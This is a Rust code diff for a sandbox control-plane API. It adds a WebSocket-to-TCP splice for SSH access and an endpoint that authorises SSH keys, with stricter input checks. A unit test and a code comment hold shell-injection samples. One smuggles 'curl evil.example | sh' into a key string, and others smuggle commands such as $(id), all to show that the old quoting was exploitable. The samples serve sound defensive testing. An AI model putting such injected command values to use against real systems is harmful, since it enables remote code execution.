@@ -79,6 +79,22 @@ struct AgentConn {
     streams: StreamSinks,
 }
 
+/// The write half of a [`TunnelStream`].
+#[derive(Clone)]
+pub struct StreamSender {
+    id: u64,
+    bin_tx: mpsc::Sender<Vec<u8>>,
+}
+
+impl StreamSender {
+    pub async fn send(&self, bytes: &[u8]) -> bool {
+        let mut frame = Vec::with_capacity(8 + bytes.len());
+        frame.extend_from_slice(&self.id.to_le_bytes());
+        frame.extend_from_slice(bytes);
+        self.bin_tx.send(frame).await.is_ok()
+    }
+}
+
 /// What the agent reports about a port inside the sandbox.
 #[derive(Debug, Clone)]
 pub struct PortProbe {
@@ -116,6 +132,15 @@ impl TunnelStream {
 
     pub fn id(&self) -> u64 {
         self.id
+    }
+
+    /// A send-only half, so a bidirectional splice can move each direction into
+    /// its own task instead of sharing one `&mut self`.
+    pub fn sender(&self) -> StreamSender {
+        StreamSender {
+            id: self.id,
+            bin_tx: self.bin_tx.clone(),
+        }
     }
 
     /// Tell the agent to close, and stop routing to this stream.
@@ -582,6 +607,36 @@ mod tests {
         assert!(frame.get("stderr").is_none());
     }
 
+    /// The exact shape that made the interpolated version exploitable: a valid
+    /// key prefix, no newline, and a quote character that escaped the single
+    /// quoting. The key now travels as an argv element, and the charset check
+    /// rejects it outright.
+    #[test]
+    fn ssh_key_charset_rejects_quote_injection() {
+        let bad = "ssh-rsa AAAA' ; curl evil.example | sh ; echo '";
+        assert!(bad.starts_with("ssh-"), "the prefix check alone passes it");
+        assert!(!bad.contains('\n'), "the newline check alone passes it");
+        let allowed = |k: &str| {
+            k.chars()
+                .all(|c| c.is_ascii_alphanumeric() || " +/=@._:-,".contains(c))
+        };
+        assert!(!allowed(bad), "quote injection must be rejected");
+        assert!(
+            allowed("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIabc+/= user@host"),
+            "a real key must still be accepted"
+        );
+        // Other shell metacharacters are out too.
+        for k in [
+            "ssh-rsa AAAA`id`",
+            "ssh-rsa AAAA$(id)",
+            "ssh-rsa AAAA;id",
+            "ssh-rsa AAAA|id",
+            "ssh-rsa AAAA&id",
+        ] {
+            assert!(!allowed(k), "{k} must be rejected");
+        }
+    }
+
     #[tokio::test]
     async fn request_returns_none_without_a_tunnel() {
         let reg = AgentRegistry::new();
@@ -592,4 +647,187 @@ mod tests {
             .await;
         assert!(out.is_none(), "no tunnel must fall back, not error");
     }
+}
+
+// ---------------------------------------------------------------------------
+// Raw TCP splice over a client WebSocket
+// ---------------------------------------------------------------------------
+
+/// `GET /api/v1/sandboxes/:id/tcp/:port` — splice a client WebSocket to a TCP
+/// port inside the sandbox.
+///
+/// This is the transport under `ori ssh`, `ori scp` and `ori forward`. The
+/// control plane is a pipe: SSH's own cryptography runs end to end inside it,
+/// so this endpoint authorises *access to the machine* and never sees the
+/// session. `sshd` stays bound to loopback and nothing new is exposed.
+///
+/// The token is accepted as a query parameter as well as a header, because a
+/// WebSocket opened from a browser cannot set headers and the dashboard will
+/// want the same endpoint.
+pub async fn tcp_splice(
+    State(state): State<AppState>,
+    axum::extract::Path((id, port)): axum::extract::Path<(String, u16)>,
+    auth: axum::Extension<crate::auth::ApiKeyAuth>,
+    ws: WebSocketUpgrade,
+) -> ApiResult<Response> {
+    let exists: Option<(String,)> =
+        sqlx::query_as("SELECT id FROM sandboxes WHERE id = ? AND account_id = ?")
+            .bind(&id)
+            .bind(&auth.account_id)
+            .fetch_optional(&state.db)
+            .await
+            .map_err(|e| ApiError::internal(format!("sandbox lookup: {e}")))?;
+    exists.ok_or_else(|| ApiError::not_found("sandbox"))?;
+
+    let stream = state.agents.open_tcp(&id, port).await.ok_or_else(|| {
+        ApiError::provider_unavailable(
+            "no agent tunnel for this sandbox; nothing to connect to".to_string(),
+        )
+    })?;
+
+    Ok(ws.on_upgrade(move |socket| splice(socket, stream)))
+}
+
+/// Pump bytes both ways until either side closes.
+///
+/// Both directions run as independent tasks and either one finishing tears the
+/// other down: an ssh session that ends in one direction must not leave the
+/// other half pinned open waiting for bytes that will never come.
+async fn splice(socket: WebSocket, mut stream: TunnelStream) {
+    let (mut ws_tx, mut ws_rx) = socket.split();
+    let sender = stream.sender();
+
+    // sandbox -> client
+    let down = tokio::spawn(async move {
+        while let Some(chunk) = stream.recv().await {
+            if ws_tx.send(Message::Binary(chunk)).await.is_err() {
+                break;
+            }
+        }
+        let _ = ws_tx.close().await;
+    });
+
+    // client -> sandbox
+    let up = tokio::spawn(async move {
+        while let Some(Ok(msg)) = ws_rx.next().await {
+            let bytes = match msg {
+                Message::Binary(b) => b,
+                Message::Text(t) => t.into_bytes(),
+                Message::Close(_) => break,
+                _ => continue,
+            };
+            if !sender.send(&bytes).await {
+                break;
+            }
+        }
+    });
+
+    tokio::select! {
+        _ = down => {}
+        _ = up => {}
+    }
+}
+
+/// Body of `POST /api/v1/sandboxes/:id/sshkey`.
+#[derive(Debug, serde::Deserialize)]
+#[serde(rename_all = "camelCase")]
+pub struct SshKeyRequest {
+    /// An OpenSSH public key line.
+    pub public_key: String,
+}
+
+/// Authorise an SSH public key inside the sandbox.
+///
+/// Append-only and idempotent: it must never clobber keys a user put there
+/// themselves. Keys land for the unprivileged `work` user, because the golden
+/// image ships the distro default `PermitRootLogin prohibit-password`.
+pub async fn authorize_ssh_key(
+    State(state): State<AppState>,
+    axum::extract::Path(id): axum::extract::Path<String>,
+    auth: axum::Extension<crate::auth::ApiKeyAuth>,
+    axum::Json(req): axum::Json<SshKeyRequest>,
+) -> ApiResult<axum::Json<serde_json::Value>> {
+    let key = req.public_key.trim().to_string();
+    // A newline would let one request write several authorized_keys lines.
+    if key.is_empty() || key.contains('\n') || key.contains('\r') {
+        return Err(ApiError::invalid_request(
+            "publicKey must be a single OpenSSH public key line",
+        ));
+    }
+    if !key.starts_with("ssh-") && !key.starts_with("ecdsa-") && !key.starts_with("sk-") {
+        return Err(ApiError::invalid_request(
+            "publicKey does not look like an OpenSSH public key",
+        ));
+    }
+    // Defence in depth. The key is passed as an argv element below and is never
+    // re-parsed by a shell, but a conservative charset also rules out anything
+    // that could confuse `authorized_keys` parsing itself.
+    if !key
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || " +/=@._:-,".contains(c))
+    {
+        return Err(ApiError::invalid_request(
+            "publicKey contains characters that are not valid in an OpenSSH key line",
+        ));
+    }
+
+    let exists: Option<(String,)> =
+        sqlx::query_as("SELECT id FROM sandboxes WHERE id = ? AND account_id = ?")
+            .bind(&id)
+            .bind(&auth.account_id)
+            .fetch_optional(&state.db)
+            .await
+            .map_err(|e| ApiError::internal(format!("sandbox lookup: {e}")))?;
+    exists.ok_or_else(|| ApiError::not_found("sandbox"))?;
+
+    // The key is passed as `$1`, NOT interpolated into the script.
+    //
+    // An earlier version embedded it inside single quotes and reasoned that a
+    // real key contains no quote characters. That is true of legitimate keys and
+    // irrelevant for untrusted input: `ssh-rsa AAAA' ; curl x | sh ; echo '`
+    // passes a prefix check, contains no newline, and escapes the quoting. An
+    // argv element is never re-parsed by the shell, so there is nothing to
+    // escape from.
+    let script = "set -e; key=$1; u=work; \
+         h=$(getent passwd \"$u\" | cut -d: -f6); h=${h:-/home/work}; \
+         mkdir -p \"$h/.ssh\"; chmod 700 \"$h/.ssh\"; \
+         touch \"$h/.ssh/authorized_keys\"; chmod 600 \"$h/.ssh/authorized_keys\"; \
+         grep -qxF \"$key\" \"$h/.ssh/authorized_keys\" \
+           || printf '%s\\n' \"$key\" >> \"$h/.ssh/authorized_keys\"; \
+         chown -R \"$u\" \"$h/.ssh\" 2>/dev/null || true; echo authorized"
+        .to_string();
+
+    let frame = state
+        .agents
+        .exec(
+            &id,
+            &[
+                "sh".to_string(),
+                "-c".to_string(),
+                script,
+                "ori-sshkey".to_string(),
+                key.clone(),
+            ],
+            None,
+            Some(30),
+            false,
+        )
+        .await
+        .ok_or_else(|| {
+            ApiError::provider_unavailable(
+                "no agent tunnel for this sandbox; cannot authorise a key".to_string(),
+            )
+        })?;
+
+    let code = frame.get("exitCode").and_then(|v| v.as_i64()).unwrap_or(-1);
+    if code != 0 {
+        let err = frame
+            .get("stderr")
+            .and_then(|v| v.as_str())
+            .unwrap_or("unknown error");
+        return Err(ApiError::internal(format!(
+            "authorising the key failed (exit {code}): {err}"
+        )));
+    }
+    Ok(axum::Json(json!({"authorized": true, "user": "work"})))
 }
